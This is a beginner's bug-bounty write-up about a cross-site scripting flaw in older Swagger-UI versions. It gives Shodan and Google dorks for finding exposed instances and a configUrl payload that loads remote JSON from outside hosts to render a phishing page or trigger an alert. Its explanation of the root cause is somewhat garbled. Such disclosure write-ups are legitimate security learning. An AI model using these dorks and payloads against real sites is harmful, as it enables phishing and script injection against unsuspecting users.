---
title: "My first Valid Finding | Unveiling Cross-Site Scripting in Swagger-ui"
date: 2023-10-30
draft: false
series: "Bug Hunting"
tags: ["bug bounty hunting", "write-up"]
---

---

السَّلَامُ عَلَيْكُمْ و رحمة الله وبركاته

peace be upan you ! : 💐

Welcome to my first write-up 📝, where I share the exciting tale of my discovery and reporting of Swagger-UI vuln app and how i was able to exploit it!

so, lets go on and start with a short intro about the vulnerablity!

## Swagger-UI’s XSS :

Swagger-UI, a popular tool for designing, building, and documenting APIs, provides a user-friendly interface for developers to explore and interact with API endpoints. However, like any web application, Swagger-UI is not immune to security vulnerabilities.
and The root cause is that Swagger-UI allows users to provide a URL for an API specification, such as a YAML or JSON file in outdated version of DomPurify, an XML sanitizer library for HTML, MathML, and SVG.To view and render them, you add a query parameter. It would be possible to trigger an XSS and html injection by loading a malicious!!

- for more about this vuln, please check the References !

### The Story Unfolds: The Journey Begins ✨ !!

so During my 🔎 of the Swagger-ui application, that I found via shodan by using specific Dorks! Here are a few dorks that you can use to search in Shodan for Swagger-UI:

- Remediation : Swagger UI versions affected with the XSS: >=3.14.1 < 3.38.0

```
"Swagger-UI"
"Swagger-UI title:Swagger UI"
"Swagger-UI port:80"
"Swagger-UI http.component:swagger-ui"
"Swagger-UI http.favicon.hash:-116323821"

```

also u can use Google Dorks :

```
site:example.com intitle:"Swagger UI"
inurl:"swagger-ui.html"
intitle:"index of" swagger-ui
intext:"Powered by Swagger UI"
site:github.com inurl:swagger-ui
```

so ! I stumbled upon a potential XSS vulnerability. By appending a specific payloads to the Swagger UI URL, I was able to inject it! then after Searching more I found an payload for rendering an phishing page as json file!

. The steps to reproduce the bug were as follows:

- Visit the Swagger UI URL:

```
 https://127.0.0.1/swagger/index.html.
```

- Append the following payload to the URL _ I used payload for rendering phishing page : as shown below _:

```
?configUrl=https://tearful-earth.surge.sh/test.json.
```

- The resulting URL should be:

```
 https://127.0.0.1/swagger/index.html?configUrl=https://tearful-earth.surge.sh/test.json.
```

![image tooltip here](https://github.com/khawla-abdulsattar/poison/blob/main/static/images/dhey.PNG?raw=true)

- note : you can also append this payload to the end of the Swagger UI URL! u will see an alert dialog

```
?configUrl=https://xss.smarpo.com/test.json

```

---

As I conclude this article, I hope that my journey has ignited a spark within you ⚡: .
Whether you're a security professional or just starting your exploration of the web security realm, remember that every bug, no matter how small or seemingly insignificant, has the potential to make a significant impact.

###### thanks fot reading 💜👾

## References :

- https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
- https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks
